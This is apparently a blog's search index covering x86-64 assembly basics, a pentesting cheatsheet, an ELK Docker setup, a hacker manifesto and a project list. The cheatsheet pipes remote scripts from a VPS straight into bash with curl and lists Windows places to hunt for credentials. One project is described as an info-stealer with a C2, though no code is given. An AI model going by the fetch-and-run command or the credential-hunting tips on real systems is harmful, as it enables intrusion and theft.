rax,rbx","program-control-instructions#Program Control Instructions":"Control instructions allows to change the flow of the program and direct it to another line. We have Directives, Loops, Branching, Function Calls","ram#RAM":"Ram is a larger cache memory and much slower than Cache memory. It’s also residing physically further from the CPU, hence used after Cache memory.\nWhen a program starts, all of its data and instructions are loaded to the RAM(from storage) to be accessed whenever necessary by the CPU.\nRAM is split into four main segments\nSegment Explanation Stack Has a Last-in First-out (LIFO) design and is fixed in size. Data in it can only be accessed in a specific order by push-ing and pop-ing data. Heap Has a hierarchical design and is therefore much larger and more versatile in storing data, as data can be stored and retrieved in any order. However, this makes the heap slower than the Stack. Data Has two parts: Data, which is used to hold variables, and .bss, which is used to hold unassigned variables (i.e., buffer memory for later allocation). Text Main assembly instructions are loaded into this segment to be fetched and executed by the CPU.","registers#Registers":"CPU has a set of registers, which are the fastest components on any computer, because they are built within the CPU core. Regardless, registers are limited in size and can hold only a few bytes of data at a time. The following are the essential registers\nData Registers Pointer Registers rax (primary) rbp (Base pointer) rbx (primary) rsp (Stack pointer) rcx (primary) rip (Instruction Pointer) rdx (primary) rdi (destination) rsi (source) r8 (secondary) r9 (secondary) r10 (secondary) Note: letter r at the beginning of registers denote that these are 64-bit registers. letter e denotes that they are 32-bit registers . Like eax or ebp\nData Registers are used for storing instructions/syscalls.\nPointer Registers are used to store specific memory address pointers rbp - points to beginning of the Stack rsp - points to the current location within the Stack rip - holds the address for the next instruction\nEach register can be further divided into smaller sub-registers containing lower bits: 8-bits, 16-bits, 32-bits\nSize Example 8-bit al 16-bit ax 32-bit eax 64-bit rax","registers-addresses-and-data-types#Registers, Addresses and Data Types":"","rflags#RFLAGS":"RFLAGS(are 64-bit) register sets the necessary flags to either 0 or 1 depending a certain condition is met. For example, if sub instruction resulted in a negative value, then the SIGN FLAG SF will be set to 1. If dec instruction resulted in 0, then ZERO FLAG ZF will be set to 1 and so on.\nThere are several RFLAGS that are present in assembly programs, each with its own flag bit.\nBit location Label Explanation 0 CF Carry Flag 1 Reserved 2 PF Parity Flag 3 Reserved 4 AF Auxiliary Carry Flag 5 Reserved 6 ZF Zero Flag 7 SF Sign Flag 8 TF Trap Flag 9 IF Interrupt Flag 10 DF Direction Flag 11 OF Overflow Flag 12-13 IOPL I/O Privilege Flag 14 NT Nested Task 15 Reserved 16 RF Resume Flag 17 VM Virtual-x64 Mode 18 AC Access Control 19 VIF Virtual Interrupt Flag 20 VIP Virtual Interrupt Pending 21 ID Identification Flag 22-63 Reserved RFLAGS - 64 bit EFLAGS - 32 bit FLAGS - 16 bit\nImportant flags\nThe Carry Flag CF: Indicates whether we have a float. The Parity Flag PF: Indicates whether a number is odd or even. The Zero Flag ZF: Indicates whether a number is zero. The Sign Flag SF: Indicates whether a register is negative. global _start section .text _start: xor rax, rax ; initialize rax to 0 xor rbx, rbx ; initialize rbx to 0 inc rbx ; increment rbx to 1 loopFib: add rax, rbx ; get the next number xchg rax, rbx ; swap values cmp rbx, 10 ; do rbx - 10 js loopFib ; jump if result is \u003c0 in the example above, cmp instruction has been added. All it does is subtract second argument from first and set necessary flags in RFLAGS register. Then jump instruction checks flag condition and continues accordingly. In this case after first number is calculated cmp rbx, 10 will result in -9. js will continue loop since its condition is UNTIL DST \u003c 0","the-stack#The Stack":"The Stack is a segment of memory allocated for each program to store data in. It is used to temporarily store and retrieve data. Top of the stack is referred by the Top Stack Pointer rsp and bottom is referred as Base Stack Pointer rbp.\nData can either be pushed or pop’d from the stack. push Copies the specified register/address to the top of the stack. pop moves the item at the top of the stat to the specified register/address.\nThe stack has Last-in First-out (LIFO) design. This means we can only pop out the element that is at the top of the stack. If we push five more elements on top of it, we’ll have to pop all of them before accessing that last element.\nBefore calling functions or syscalls we need to save data to the stack. Otherwise the data will be lost. For example if we wanted to retain the current value at rax and run a syscall, we would first push rax to the stack and then call the function.\nUsing the stack is very simple. The only thing we should keep in mind is the order we push our registers and the state of the stack to safely restore our data and not restore a different value by pop when a different value is at the top of the stack.","unary#Unary":"Unary instruction take only one argument\nInstruction Explanation Example inc Increment by 1 inc rax = rax++ dec Decrement by 1 dec rax = rax--","variables#Variables":"The .data section holds variables that will be loaded into memory once the program is run\nVariables can be defined using db for a list of bytes, dw for a list of words and dd for a list of digits and so on. it is also possible to label variables for later usage\nInstruction Description db 0x0a defines the byte 0x0a which is a newline message db 0x41, 0x42, 0x43, 0x0a Defines the label message =\u003e abc\\n message db \"Hello World!\", 0x0a Defines the label message =\u003e Hello World!\\n In an example below section .data message db \"Hello World!\", 0x0a length equ $-message $ token indicates the current distance from the beginning of the current section."},"title":"Assembly Basics"},"/archive/useful-cheatsheet-for-pentesting/":{"data":{"":"0c - Useful cheatsheet for pentesting Tools are only as effective as their operator is knowledgeable. Have ready to use virtual machines of GNU/Linux and Windows alike. Use password managers and use strong passwords, preferably keep pentesting and personal workspaces separate document everything and have legal confirmations before doing any target assessment","0c---useful-cheatsheet-for-pentesting#0c - Useful cheatsheet for pentesting":"","example-penetration-testing-project-folder-structure-might-look-like-the-following#Example penetration testing project folder structure might look like the following":"george@LTP51[/PEN1]$ tree . . └── Penetration-Testing │ ├── Pre-Engagement │ └── ... ├── Network-Pentesting │ ├── Linux │ │ ├── Information-Gathering │\t│ │ └── ... │ │ ├── Vulnerability-Assessment │ │ │\t└── ... │ │\t└── ... │ │ └── ... │\t├── Windows │ │ ├── Information-Gathering │\t│ │ └── ... │\t│ └── ... │ └── ... ├── WebApp-Pentesting │ └── ... ├── Social-Engineering │ └── ... ├── ....... │ └── ... ├── Reporting │ └── ... └── Results └── ...","full-upgrade--update-of-the-system#Full upgrade \u0026amp; update of the system":"sudo apt update -y \u0026\u0026 sudo apt full-upgrade -y \u0026\u0026 sudo apt autoremove -y \u0026\u0026 sudo apt autoclean -y","general-categories-for-note-taking-during-target-assessment#General categories for note-taking during target assessment":"Newly discovered information Take note of every newly discovered vulnerabilities, targets or points of access, IP addresses, usernames, passwords, source code, etc. that you identified and are related to the penetration testing engagement and process.\nIdeas for further tests and processing You are processing hundreds if not thousands of data stream during penetration testing. It’s good record ideas that may be fleeting in the moment and may forget about it later.\nScan results With such a large amount of information in a short time, one can quickly feel overwhelmed. It is not easy at first to filter out the most critical pieces of information. So tracking details like this may come in handy.\nLogging Logging is essential for both documentation and our protection. If third parties attack the company during our penetration test and damage occurs, we can prove that the damage did not result from our activities. Tools like script and date help us track executed commands during penetration testing in organized manner. like so:\nscript 03-21-2021-0200pm-exploitation.log This will start a script logging and will save it in 03-21-2021-0200pm-exploitation.log file for later assessment. if you want to end recording type exit on the command line.\nScreenshots Screenshots serve as a momentary record and represent proof of results obtained that may not be possible to describe using words.\nUnder Windows, the SysInternals Tools suite is a set of portable Windows applications that can be used to administer Windows systems (for the most part without requiring installation). The tools can be either downloaded from the Microsoft website or by loading them directly from an internet-accessible file share by typing \\\\live.sysinternals.com\\tools into a Windows Explorer window.\nFor example, we can run procdump.exe directly without downloading it to disk like so:\nPS C:\\Users\\George\u003e \\\\live.sysinternals.com\\tools\\procdump.exe -accepteula ProcDump v11.0 - Sysinternals process dump utility Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com Monitors a process and writes a dump file when the process exceeds the specified criteria or has an exception. Capture Usage: procdump.exe [-mm] [-ma] [-mt] [-mp] [-mc \u003cMask\u003e] [-md \u003cCallback_DLL\u003e] [-mk] [-n \u003cCount\u003e] [-s \u003cSeconds\u003e] [-c|-cl \u003cCPU_Usage\u003e [-u]] [-m|-ml \u003cCommit_Usage\u003e] [-p|-pl \u003cCounter\u003e \u003cThreshold\u003e] [-h] [-e [1] [-g] [-b] [-ld] [-ud] [-ct] [-et]] [-l] Process Explorer is a part of the Sysinternals tool suite. This tool can show which handles and DLL processes are loaded when a program runs.","installing-multiple-packages-at-once#Installing multiple packages at once":"└──╼ $ cat install.list netcat radare2 nmap seclists tcpdump hashcat wireshark git gobuster sudo apt install $(cat install.list | tr \"\\n\" \" \") -y","powershell-tools-for-sysadminspentesters#PowerShell tools for sysadmins/pentesters":"AdminToolbox - collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more. ActiveDirectory - collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it. Empire/Situational Awareness - collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by BC Security as a part of their Empire Framework. Inveigh - a tool built to perform network spoofing and Man-in-the-middle attacks. Bloodhound / SharpHound - allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.","running-multiple-bash-configurations-at-once-on-the-system#Running multiple \u003ccode\u003ebash\u003c/code\u003e configurations at once on the system":"user@user:~$ cat automation_scripts.txt terminal.sh tools.sh GUI.sh network.sh vim.sh for script in $(cat customization-scripts.txt); do curl -s http://myvps.vps-provider.net/$script | bash; done","useful-directories-to-look-for-under-windows#Useful Directories to look for under Windows":"Appdata\\ folder. many applications store their config and temp data here\nUser folder like C:\\Users\\User. SSH, VPN keys and more may be stored here as hidden files.\nConsole history is a goldmine. esp with admin access\nC:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt Get-Content (Get-PSReadlineOption).HistorySavePath user clipboard may indicate at something. Get-Clipboard\nScheduled tasks.\nAD is designed to be backward-compatible, and many features are arguably not “secure by default”. AD is essentially a sizeable read-only database accessible to all users within the domain, regardless of their privilege level. A basic AD user account with no added privileges can enumerate most objects within AD","windows-host-enumeration-general-data#Windows host enumeration general data":"Failing to follow any guided structure while performing enumeration, we will struggle to know if we have all the required information to reach our goal. It can be easy to write off a system as being completely patched and not vulnerable to any current CVEs or the latest vulnerabilities. However, if you only focus on that aspect, it is easy to miss out on the many human configuration errors that could exist in the environment. This is why taking our time and gathering all of the information we can on a system or environment should be prioritized in terms of importance over simply exploiting a system.\nrenaming all file extensions in a folder find . -name \"*.old\" -exec rename -v 's/\\.old$/\\.new/i' {} \\;"},"title":"useful-cheatsheet-for-pentesting"},"/engineering/":{"data":{"":"Configuring an ELK Stack Part 1"},"title":"Engineering Logs"},"/engineering/configuring-an-elk-stack-part-1/":{"data":{"":"In this article, I’ll be configuring ELK stack in docker. This will be 2 part series where first one will focus on configuring base ELK and second one more advanced stuff.\nI’m following the official Elastic guide on setting it up in docker using docker-compose.\nLet’s begin.\nFile structure First thing, I’m going to create initial file structure for docker, where Kibana, Metricbeat and Logstash will be able to use these files.\ntouch .env docker-compose.yml filebeat.yml logstash.conf metricbeat.yml tree -la . ├── docker-compose.yml ├── .env ├── filebeat.yml ├── logstash.conf └── metricbeat.yml 1 directory, 5 files Configuration files Next, I’m going to configure files that were just created","base-setup#Base Setup":"","conclusion#Conclusion":"In this article, I demonstrated how it is possible to set-up ELK Stack in its basic form.\nThe files for this setup is uploaded on my github page for public availability.\nIn the next part, I’ll look at more advanced configuration of Elastic.\nUntil then.","configuration-files#Configuration files":"","copying-valid-certificates#Copying valid certificates":"Now that the system is up and running I need to make sure that valid certificates for docker container is present in my local machine.\nHere I copy certificate from docker machine to /tmp/ folder.\ndocker cp elk-stack-es01-1:/usr/share/elasticsearch/config/certs/ca/ca.crt /tmp/. now let’s test it.\ncurl --cacert /tmp/ca.crt -u elastic:elpass https://localhost:9200 Successful response:\n{ \"name\" : \"es01\", \"cluster_name\" : \"docker-cluster\", \"cluster_uuid\" : \"ItB3TTyJTMqX5K6McWGaCw\", \"version\" : { \"number\" : \"8.7.1\", \"build_flavor\" : \"default\", \"build_type\" : \"docker\", \"build_hash\" : \"f229ed3f893a515d590d0f39b05f68913e2d9b53\", \"build_date\" : \"2023-04-27T04:33:42.127815583Z\", \"build_snapshot\" : false, \"lucene_version\" : \"9.5.0\", \"minimum_wire_compatibility_version\" : \"7.17.0\", \"minimum_index_compatibility_version\" : \"7.0.0\" }, \"tagline\" : \"You Know, for Search\" } Notice that we can access elasticsearch using localhost:9200.","docker-composeyml#docker-compose.yml":"Add the following to docker-compose.yml\nes01: depends_on: setup: condition: service_healthy image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION} labels: co.elastic.logs/module: elasticsearch volumes: - certs:/usr/share/elasticsearch/config/certs - esdata01:/usr/share/elasticsearch/data ports: - ${ES_PORT}:9200 environment: - node.name=es01 - cluster.name=${CLUSTER_NAME} - discovery.type=single-node - ELASTIC_PASSWORD=${ELASTIC_PASSWORD} - bootstrap.memory_lock=true - xpack.security.enabled=true - xpack.security.http.ssl.enabled=true - xpack.security.http.ssl.key=certs/es01/es01.key - xpack.security.http.ssl.certificate=certs/es01/es01.crt - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt - xpack.security.transport.ssl.enabled=true - xpack.security.transport.ssl.key=certs/es01/es01.key - xpack.security.transport.ssl.certificate=certs/es01/es01.crt - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt - xpack.security.transport.ssl.verification_mode=certificate - xpack.license.self_generated.type=${LICENSE} mem_limit: ${ES_MEM_LIMIT} ulimits: memlock: soft: -1 hard: -1 healthcheck: test: [ \"CMD-SHELL\", \"curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q 'missing authentication credentials'\", ] interval: 10s timeout: 10s retries: 120 This is docker cluster configuration, where CA certificate and node path is specified. In this case Elasticsearch data and certifications are not stored in docker container. Instead they will be saved in local storage for data persistence and robustness.\nvolumes: - certs:/usr/share/elasticsearch/config/certs - esdata01:/usr/share/elasticsearch/data With both these configurations set up, now I can perform docker compose up command to create and run containers.\nNote: docker compose up command should be run in the folder where docker-compose.yml resides.\nHere’s my example:\nHere you can see that elastic-network and container has successfully run.\nIn case you need docker composer commands, here are a few useful ones:\nCommand Description docker compose up Created and starts all containers within docker-compose.yml docker compose down Stops all containers and removes any networks relating to docker-compose.yml. Leaves Volumes intact and allows generated data to persist between builds docker compose down -v Same as above and removes Volumes. basically starting over. docker compose start starts existing containers docker compose stop Stops all containers. same as CTRL+C","docker-composeyml-1#docker-compose.yml":"Now I can add Kibana container config in docker-compose.yml and specify that it should run after Elasticsearch node.\nAdd the following to docker-compose.yml\nkibana: depends_on: es01: condition: service_healthy image: docker.elastic.co/kibana/kibana:${STACK_VERSION} labels: co.elastic.logs/module: kibana volumes: - certs:/usr/share/kibana/config/certs - kibanadata:/usr/share/kibana/data ports: - ${KIBANA_PORT}:5601 environment: - SERVERNAME=kibana - ELASTICSEARCH_HOSTS=https://es01:9200 - ELASTICSEARCH_USERNAME=kibana_system - ELASTICSEARCH_PASSWORD=${KIBANA_PASSWORD} - ELASTICSEARCH_SSL_CERTIFICATEAUTHORITIES=config/certs/ca/ca.crt - XPACK_SECURITY_ENCRYPTIONKEY=${ENCRYPTION_KEY} - XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=${ENCRYPTION_KEY} - XPACK_REPORTING_ENCRYPTIONKEY=${ENCRYPTION_KEY} mem_limit: ${KB_MEM_LIMIT} healthcheck: test: [ \"CMD-SHELL\", \"curl -s -I http://localhost:5601 | grep -q 'HTTP/1.1 302 Found'\", ] interval: 10s timeout: 10s retries: 120 Now you can either use Docker Desktop to enable Kibana container or just use terminal CTLR+C your container and rerun docker compose up\nNow, open up browser and go to localhost:5601 to see your elastic up and running.\nAwesome! Now try logging in with credentials that was specified in .env file. It should log in without any problems.","docker-composeyml-2#docker-compose.yml":"Now that Kibana and Elasticsearch are running and communicating, I can continue and setup Metricbeat same as Kibana before.\nAdd the following to docker-compose.yml metricbeat01: depends_on: es01: condition: service_healthy kibana: condition: service_healthy image: docker.elastic.co/beats/metricbeat:${STACK_VERSION} user: root volumes: - certs:/usr/share/metricbeat/certs - metricbeatdata01:/usr/share/metricbeat/data - \"./metricbeat.yml:/usr/share/metricbeat/metricbeat.yml:ro\" - \"/var/run/docker.sock:/var/run/docker.sock:ro\" - \"/sys/fs/cgroup:/hostfs/sys/fs/cgroup:ro\" - \"/proc:/hostfs/proc:ro\" - \"/:/hostfs:ro\" environment: - ELASTIC_USER=elastic - ELASTIC_PASSWORD=${ELASTIC_PASSWORD} - ELASTIC_HOSTS=https://es01:9200 - KIBANA_HOSTS=http://kibana:5601 - LOGSTASH_HOSTS=http://logstash01:9600","docker-composeyml-3#docker-compose.yml":"Append the following to docker-compose.yml\nfilebeat01: depends_on: es01: condition: service_healthy image: docker.elastic.co/beats/filebeat:${STACK_VERSION} user: root volumes: - certs:/usr/share/filebeat/certs - filebeatdata01:/usr/share/filebeat/data - \"./filebeat_ingest_data/:/usr/share/filebeat/ingest_data/\" - \"./filebeat.yml:/usr/share/filebeat/filebeat.yml:ro\" - \"/var/lib/docker/containers:/var/lib/docker/containers:ro\" - \"/var/run/docker.sock:/var/run/docker.sock:ro\" environment: - ELASTIC_USER=elastic - ELASTIC_PASSWORD=${ELASTIC_PASSWORD} - ELASTIC_HOSTS=https://es01:9200 - KIBANA_HOSTS=http://kibana:5601 - LOGSTASH_HOSTS=http://logstash01:9600","docker-composeyml-logstash01-container#docker-compose.yml (\u0026rsquo;logstash01\u0026rsquo; container)":"Add the following to docker-compose.yml\nlogstash01: depends_on: es01: condition: service_healthy kibana: condition: service_healthy image: docker.elastic.co/logstash/logstash:${STACK_VERSION} labels: co.elastic.logs/module: logstash user: root volumes: - certs:/usr/share/logstash/certs - logstashdata01:/usr/share/logstash/data - \"./logstash_ingest_data/:/usr/share/logstash/ingest_data/\" - \"./logstash.conf:/usr/share/logstash/pipeline/logstash.conf:ro\" environment: - xpack.monitoring.enabled=false - ELASTIC_USER=elastic - ELASTIC_PASSWORD=${ELASTIC_PASSWORD} - ELASTIC_HOSTS=https://es01:9200","docker-composeyml-setup-container#docker-compose.yml (\u0026lsquo;setup\u0026rsquo; container)":"Note: From this point on, make sure syntax is correct in these configuration files. especially spelling and indentation. Otherwise docker will not setup the containers.\nversion: \"3.8\" // This is deprecated. you can just remove this line volumes: certs: driver: local esdata01: driver: local kibanadata: driver: local metricbeatdata01: driver: local filebeatdata01: driver: local logstashdata01: driver: local networks: default: name: elastic-network external: false services: setup: image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION} volumes: - certs:/usr/share/elasticsearch/config/certs user: \"0\" command: \u003e bash -c ' if [ x${ELASTIC_PASSWORD} == x ]; then echo \"Set the ELASTIC_PASSWORD environment variable in the .env file\"; exit 1; elif [ x${KIBANA_PASSWORD} == x ]; then echo \"Set the KIBANA_PASSWORD environment variable in the .env file\"; exit 1; fi; if [ ! -f config/certs/ca.zip ]; then echo \"Creating CA\"; bin/elasticsearch-certutil ca --silent --pem -out config/certs/ca.zip; unzip config/certs/ca.zip -d config/certs; fi; if [ ! -f config/certs/certs.zip ]; then echo \"Creating certs\"; echo -ne \\ \"instances:\\n\"\\ \" - name: es01\\n\"\\ \" dns:\\n\"\\ \" - es01\\n\"\\ \" - localhost\\n\"\\ \" ip:\\n\"\\ \" - 127.0.0.1\\n\"\\ \" - name: kibana\\n\"\\ \" dns:\\n\"\\ \" - kibana\\n\"\\ \" - localhost\\n\"\\ \" ip:\\n\"\\ \" - 127.0.0.1\\n\"\\ \u003e config/certs/instances.yml; bin/elasticsearch-certutil cert --silent --pem -out config/certs/certs.zip --in config/certs/instances.yml --ca-cert config/certs/ca/ca.crt --ca-key config/certs/ca/ca.key; unzip config/certs/certs.zip -d config/certs; fi; echo \"Setting file permissions\" chown -R root:root config/certs; find . -type d -exec chmod 750 \\{\\} \\;; find . -type f -exec chmod 640 \\{\\} \\;; echo \"Waiting for Elasticsearch availability\"; until curl -s --cacert config/certs/ca/ca.crt https://es01:9200 | grep -q \"missing authentication credentials\"; do sleep 30; done; echo \"Setting kibana_system password\"; until curl -s -X POST --cacert config/certs/ca/ca.crt -u \"elastic:${ELASTIC_PASSWORD}\" -H \"Content-Type: application/json\" https://es01:9200/_security/user/kibana_system/_password -d \"{\\\"password\\\":\\\"${KIBANA_PASSWORD}\\\"}\" | grep -q \"^{}\"; do sleep 10; done; echo \"All done!\"; ' healthcheck: test: [\"CMD-SHELL\", \"[ -f config/certs/es01/es01.crt ]\"] interval: 1s timeout: 5s retries: 120 This is a base setup for docker compose where storage volume path, network and services are enabled and specified.","elasticsearch#Elasticsearch":"Here, I setup elasticsearch","env#.env":"# Project name (if not set, select cwd) #COMPOSE_PROJECT_NAME=elk-stack # Password for the 'elastic' user(min 6 characters) ELASTIC_PASSWORD=elpass # Password for the 'kibana_system' user(min 6 characters) KIBANA_PASSWORD=kipass # Version of Elastic products STACK_VERSION=8.7.1 # Cluster name CLUSTER_NAME=docker-cluster # set license to 'basic' or 'trial' for 30-day trial LICENSE=basic # Port to expose Elasticsearch HTTP API to the host ES_PORT=9200 # Port to expose Kibana to the host KIBANA_PORT=5601 # Available host memory for each service in bytes (1GB) ES_MEM_LIMIT=1073741824 KB_MEM_LIMIT=1073741824 LS_MEM_LIMIT=1073741824 # Sample predefined key only for testing environments ENCRYPTION_KEY=c34d38b3a14956121ff2170e5030b471551370178f43e5626eec58b04a30fae2 Here, I configure all the necessary variables for elastic to work properly, like passwords, ports, memory limits and so on.\nAll of the variables that can be configured can be found at Elastic docs","file-structure#File structure":"","filebeat#Filebeat":"Now that this cluster is stable and monitored with Metricbeat, we can install Filebeat for log ingestion.","filebeatyml#filebeat.yml":"filebeat.inputs: - type: filestream id: default-filestream paths: - ingest_data/*.log filebeat.autodiscover: providers: - type: docker hints.enabled: true processors: - add_docker_metadata: ~ setup.kibana: host: ${KIBANA_HOSTS} username: ${ELASTIC_USER} password: ${ELASTIC_PASSWORD} output.elasticsearch: hosts: ${ELASTIC_HOSTS} username: ${ELASTIC_USER} password: ${ELASTIC_PASSWORD} ssl.enabled: true ssl.certificate_authorities: \"certs/ca/ca.crt\" disable filebeat.yml execution permission and restart container\nchmod go-w filebeat.yml docker compose up","kibana#Kibana":"","logstash#Logstash":"Final container I’m going to setup is logstash which will help us to manage and transform logs.","logstashconf#logstash.conf":"input { file { #https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html #default is TAIL which assumes more data will come into the file. #change to mode =\u003e \"read\" if the file is a compelte file. by default, the file will be removed once reading is complete -- backup your files if you need them. mode =\u003e \"tail\" path =\u003e \"/usr/share/logstash/ingest_data/*\" } } filter { } output { elasticsearch { index =\u003e \"logstash-%{+YYYY.MM.dd}\" hosts=\u003e \"${ELASTIC_HOSTS}\" user=\u003e \"${ELASTIC_USER}\" password=\u003e \"${ELASTIC_PASSWORD}\" cacert=\u003e \"certs/ca/ca.crt\" } } Restart composer.","metricbeat#Metricbeat":"","metricbeatyml#metricbeat.yml":"metricbeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false metricbeat.modules: - module: elasticsearch xpack.enabled: true period: 10s hosts: ${ELASTIC_HOSTS} username: ${ELASTIC_USER} password: ${ELASTIC_PASSWORD} ssl.certificate_authorities: \"certs/ca/ca.crt\" ssl.certificate: \"certs/es01/es01.crt\" ssl.key: \"certs/es01/es01.key\" - module: logstash xpack.enabled: true period: 10s hosts: ${LOGSTASH_HOSTS} - module: kibana metricsets: - stats period: 10s hosts: ${KIBANA_HOSTS} username: ${ELASTIC_USER} password: ${ELASTIC_PASSWORD} xpack.enabled: true - module: docker metricsets: - \"container\" - \"cpu\" - \"diskio\" - \"healthcheck\" - \"info\" #- \"image\" - \"memory\" - \"network\" hosts: [\"unix:///var/run/docker.sock\"] period: 10s enabled: true processors: - add_host_metadata: ~ - add_docker_metadata: ~ output.elasticsearch: hosts: ${ELASTIC_HOSTS} username: ${ELASTIC_USER} password: ${ELASTIC_PASSWORD} ssl: certificate: \"certs/es01/es01.crt\" certificate_authorities: \"certs/ca/ca.crt\" key: \"certs/es01/es01.key\" Disable metricbeat.yml execution permission and restart composer chmod go-w metricbeat.yml docker compose up Now add out-of-the-box rules.\nGo to: Menu \u003e Management \u003e Stack Monitoring\nHere, official guide suggests Set up monitoring with Metricbeat but it didn’t find anything automatically, so I went with manual configuration.\nafter configuring this step you should see the following in monitoring tab","note#NOTE":"Now, to actually see the logstash data index, you need to add sample log files in logstash_ingest_data and filebeat_ingest_data first.\nFor that, I used Mockaroo to create sample log file.\nDownload and rename it from .csv to .log files.\nMy mock data test_log.log looks like the following\ntime,id,first_name,last_name,email,mac_address,ip_address,hash 4/17/2024,1,Rania,Cressey,rcressey0@reference.com,F9-E0-79-93-F6-DA,130.148.172.136,51ba1df5efb4de21b434d94d1e72615b57c30721 12/30/2023,2,Gerhard,Mewton,gmewton1@businessinsider.com,CA-36-6B-25-5B-16,187.64.188.232,9afff3f236157637cdf36f3a116b3f5d3ac3deb0 9/1/2024,3,Anabel,Musk,amusk2@opensource.org,FF-AB-36-D7-DA-E3,105.172.167.115,31f37d280ddf812083dbce74c9a0491b62bacfbd 4/29/2024,4,Mike,Stannas,mstannas3@jalbum.net,D0-B4-C0-DD-B0-00,70.70.51.36,4ed691e0ebd4c17dd2125a460bd92f6ca37cd095 8/1/2024,5,Tadd,Nurden,tnurden4@webmd.com,FA-EC-F3-2C-A4-4E,101.82.60.252,dc5e68d384de61e69fe0798deab41f65040cca56 6/12/2024,6,Neall,Vaulkhard,nvaulkhard5@ucsd.edu,36-78-C0-8B-4C-EF,47.129.241.26,456b8cfcc04155848d993790be677a374a910cb8 2/12/2024,7,Lilli,Linnane,llinnane6@blinklist.com,29-7E-61-0D-27-BA,196.177.55.60,d9c33fe2e9c21d31f88801402606d998c35f80dd 8/3/2024,8,Ianthe,Antognetti,iantognetti7@imdb.com,5E-F1-AF-90-E0-81,121.223.169.75,a17aa33138a84ee53283012338c9c1f0d9c324c9 9/9/2024,9,Piper,Victor,pvictor8@usatoday.com,0E-6D-6C-9B-43-1A,160.228.92.124,6e609309d997e6fa708cdcef0b11425c3bf84341 Which I dropped in logstash_ingest_data/ and filebeat_ingest_data/.\nNow it’ll take a few seconds for Elastic to see the changes in Menu \u003e Stack management \u003e Index management \u003e Reload Indices\nAnd here should be logstash data logs.\nNow, to see the data, I need to create Data View for the “logstash- *” pattern.\nGo to: Menu \u003e Analytics \u003e Discover \u003e Create data view\nIf you finished all the steps successfuly, you should see the following stack setup in the Stack Monitoring tab"},"title":"Configuring an ELK Stack Part 1"},"/manifesto/":{"data":{"hacker-manifesto#Hacker Manifesto":"Hacker Manifesto Hackers solve problems and build things. he believes in freedom and mutual help. To be accepted as a hacker, you have to behave as though you have this kind of attitude yourself. and to behave as such, you have to really believe the attitude. Becoming the kind of person who believes these things is important for me - to help me keep learning and stay motivated. As with every other creative art, the most effective way to become a master is to imitate the mindset of masters - not just intellectually but emotionally as well. if you really want to become a hacker, repeat these steps until you believe them:\nThe world is full of fascinating problems waiting to be solved. To be a hacker you have to get a thrill from solving problems, sharpening your mind and skills and intelligence. I’ll need to become this kind of person to make it as a hacker. Also I need to develop faith in my own learning capacity. Realize that if I tackle problem piece by piece, even when I don’t know enough, I’ll learn enough to solve the next piece - and so on, until I’m done. No problem should ever be solved twice. Creative brain is a valuable, limited resource. They shouldn’t be wasted on reinventing the wheel when there are so many new fascinating problems out there. To behave like a hacker, realize that the thinking time of other hackers is precious - so much so that it’s almost a moral duty to share information, solve problems and give the solutions away so other hackers can solve new problems instead of having to perpetually readdress old ones. You do not necessarily have to share away all your discoveries and creative products, though hackers that do are the ones that get most respect from other hackers. Give away and sell enough to keep you in food and rent and computer in life. It’s more than fine to use your hacking skills to support a family or even get rich as long as you don’t forget your loyalty to your art and your fellow hackers while doing it. Boredom and mindlessness are evil. Hackers and creative people in general should never be bored or have to do stupid, repetitive work, because when this happens this means they aren’t doing what only they can do - solve new problems. This is waste of potential and creative energy. To behave like a hacker, believe this - you want to automate the boring bits as much as possible, not just for yourself, but for everybody else(esp. for other hackers.) nobody who can think should ever be forced into a situation that bores them. Freedom is good. Hackers are by nature anti-authoritarian. Anyone who can give you orders can stop you from solving whatever problem you’re fascinated by - and given the way authoritarian minds work, will generally find some appallingly stupid reason to do so. So the authoritarian attitude has to be fought wherever you find it, lest it restrict me or other hackers. This isn’t the same as fighting all authority. Children need to be guided and criminals restrained. A hacker may agree to accept some kinds of authority in order to get something he wants more than the time he spends following orders. But that’s a limited, conscious bargain; the kind of personal surrender authoritarians want is not on offer. Authoritarians thrive on censorship and secrecy. And they distrust voluntary cooperation and information-sharing — they only like ‘cooperation’ that they control. So to behave like a hacker, you have to develop an instinctive hostility to censorship, secrecy, and the use of force or deception to compel responsible adults. And you have to be willing to act on that belief Attitude is not substitute for competence. To be a hacker, develop some of these attitudes. But beware, copying an attitude won’t make you a hacker alone. any more that it will make you a champion athlete or a rock star. Becoming a hacker will take intelligence, practice, dedication, and hard work. Learn to distrust attitude and respect competence of every kind. Hackers don’t let posers waste their time, but they worship competence - especially competence at hacking, but competence at anything is valued. Competence at demanding skill that few can master is esp. good, and competence at demanding skills that involve mental acuteness, craft and concentration is best. Respect competence, and you’ll enjoy developing it in yourself - the hard work and dedication will become kind of intense play rather than routine. This attitude is vital to becoming a hacker."},"title":"manifesto"},"/projects/":{"data":{"":"Bastion Wargames Platform A hybrid wargame platform combining a CTFd frontend with a hardened Linux backend using Split-SSH architecture. Honeypot Agent A polymorphic Go-based info-stealer and C2 designed for offensive operations and honeypot monitoring. Regional CTI Dashboard A specialized Threat Intelligence platform filtering OTX and ThreatFox data for the specific geographic region using Grafana and PostgreSQL."},"title":"Project Armory"},"/projects/local-ctf-platform/":{"data":{"1-alpha-privilege-escalation#1. \u0026ldquo;Alpha\u0026rdquo; (Privilege Escalation)":"Concept: The player starts as user. The flag is the password for user+1. Mechanic: Exploiting intentional misconfigurations (e.g., SUID binaries, insecure Cron jobs, group-writable files) to pivot to the next user. Isolation: hidepid=2 ensures players cannot see processes belonging to other levels.","2-bravo-red-team--boot-to-root#2. 